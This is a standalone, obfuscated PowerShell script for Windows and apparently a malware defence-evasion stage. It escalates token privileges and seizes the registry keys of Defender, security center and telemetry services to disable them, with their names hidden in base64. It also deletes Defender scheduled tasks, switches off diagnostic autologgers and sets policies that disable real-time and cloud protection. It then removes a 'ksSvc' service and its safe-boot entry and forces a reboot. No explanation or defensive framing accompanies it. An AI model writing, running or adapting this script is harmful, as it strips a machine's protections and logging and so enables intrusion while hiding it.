$E="SilentlyContinue";$ErrorActionPreference=$E;
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class T{[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool AdjustTokenPrivileges(IntPtr h,bool d,ref L n,int l,IntPtr p,IntPtr r);[DllImport("kernel32.dll")]internal static extern IntPtr GetCurrentProcess();[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool OpenProcessToken(IntPtr h,int a,ref IntPtr p);[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool LookupPrivilegeValue(string h,string n,ref long p);[StructLayout(LayoutKind.Sequential,Pack=1)]internal struct L{public int C;public long U;public int A;}public static void E(string p){try{L t=new L();IntPtr h=IntPtr.Zero;OpenProcessToken(GetCurrentProcess(),40,ref h);t.C=1;t.U=0;t.A=2;LookupPrivilegeValue(null,p,ref t.U);AdjustTokenPrivileges(h,false,ref t,0,IntPtr.Zero,IntPtr.Zero);}catch{}}}';
try {
    & bcdedit.exe /deletevalue "{current}" safeboot > $null 2>&1;
    [T]::E("SeTakeOwnershipPrivilege");
    [T]::E("SeRestorePrivilege");
    $S=New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544");
    $A=$S.Translate([System.Security.Principal.NTAccount]);
    $V=([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luRGVmZW5kLFNlbnNlLFdkRmlsdGVyLFdkTmlzU3ZjLFdkTmlzRHJ2LHdzY3N2YyxTZ3JtQnJva2VyLFNncm1BZ2VudCxNRENvcmVTdmMsd2VidGhyZWF0ZGVmdXNlcnN2YyxTZW5zZUNuY1Byb3h5LERpYWdUcmFjayxkbXdhcHB1c2hzZXJ2aWNlLERQUyxXZGlTZXJ2aWNlSG9zdCxXZGlTeXN0ZW1Ib3N0LFN5c01haW4sV2FhU01lZGljU3ZjLFBjYVN2Yw=='))).Split(',');
    foreach($s in $V){
        $p="HKLM:\SYSTEM\CurrentControlSet\Services\$s";
        if(Test-Path $p){
            try{
                $K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),"ReadWriteSubTree","TakeOwnership");
                $C=$K.GetAccessControl();$C.SetOwner($A);$K.SetAccessControl($C);$K.Close();
                $K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),"ReadWriteSubTree","ChangePermissions");
                $C=$K.GetAccessControl();$R=New-Object System.Security.AccessControl.RegistryAccessRule($A,"FullControl",3,"None","Allow");
                $C.SetAccessRule($R);$K.SetAccessControl($C);$K.Close();
                Set-ItemProperty -Path $p -Name "Start" -Value 4 -Type DWord -EA Stop;
            }catch{}
        }
    };
    $T=([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XE1pY3Jvc29mdFxXaW5kb3dzXFdpbmRvd3MgRGVmZW5kZXJcKixcTWljcm9zb2Z0XFdpbmRvd3NcQXBwbGljYXRpb24gRXhwZXJpZW5jZVwqLFxNaWNyb3NvZnRcV2luZG93c1xDdXN0b21lciBFeHBlcmllbmNlIEltcHJvdmVtZW50IFByb2dyYW1cKixcTWljcm9zb2Z0XFdpbmRvd3NcVXBkYXRlT3JjaGVzdHJhdG9yXCosXE1pY3Jvc29mdFxXaW5kb3dzXERpc2tEaWFnbm9zdGljXCosXE1pY3Jvc29mdFxXaW5kb3dzXEF1dG9jaGtcUHJveHk='))).Split(',');
    foreach($t in $T){
        $tp="C:\Windows\System32\Tasks$t";
        $bd=Split-Path $tp;
        if (Test-Path $bd) {
            cmd.exe /c "takeown /F `"$bd`" /R /A /D Y >nul 2>&1";
            cmd.exe /c "icacls `"$bd`" /grant Administrators:F /T /C /Q >nul 2>&1";
            Get-ChildItem -Path $bd -File -Recurse | ForEach-Object { Remove-Item -Path $_.FullName -Force -EA $E; };
        }
    };
    $W=([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXV0b0xvZ2dlci1EaWFndHJhY2stTGlzdGVuZXIsRGlhZ0xvZyxXZGlDb250ZXh0TG9nLEx3dE5ldExvZyxXaUZpU2Vzc2lvbixTUU1Mb2dnZXI='))).Split(',');
    foreach($w in $W){
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\$w" -Name "Start" -Value 0 -Type DWord -EA $E;
    };
    $P=([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIsSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24sSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcU3B5bmV0LEhLTE06XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEFwcFByaXZhY3k='))).Split(',');
    $P|ForEach-Object{if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null}};
    $O=@{$P[0]=@{"DisableAntiSpyware"=1;"DisableRealtimeMonitoring"=1;"DisableAntiVirus"=1;"ServiceKeepAlive"=0};$P[1]=@{"DisableBehaviorMonitoring"=1;"DisableOnAccessProtection"=1;"DisableScanOnRealtimeEnable"=1;"DisableIOAVProtection"=1};$P[2]=@{"SpynetReporting"=0;"SubmitSamplesConsent"=2};$P[3]=@{"LetAppsRunInBackground"=2}};
    foreach($k in $O.Keys){foreach($v in $O[$k].Keys){Set-ItemProperty -Path $k -Name $v -Value $O[$k][$v] -Type DWord -EA $E;}};
} catch {
} finally {
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsUpdate" -Name "InstallDate" -EA $E;
    $ksKey="HKLM:\SYSTEM\CurrentControlSet\Services\ksSvc";if(Test-Path $ksKey){Remove-Item -Path $ksKey -Force -Recurse -EA $E;};
    $sbKey="HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ksSvc";if(Test-Path $sbKey){Remove-Item -Path $sbKey -Force -Recurse -EA $E;};
    & bcdedit.exe /deletevalue "{current}" safeboot > $null 2>&1;
    Restart-Computer -Force -ErrorAction SilentlyContinue;
    & shutdown.exe /r /t 0 /f > $null 2>&1;
}
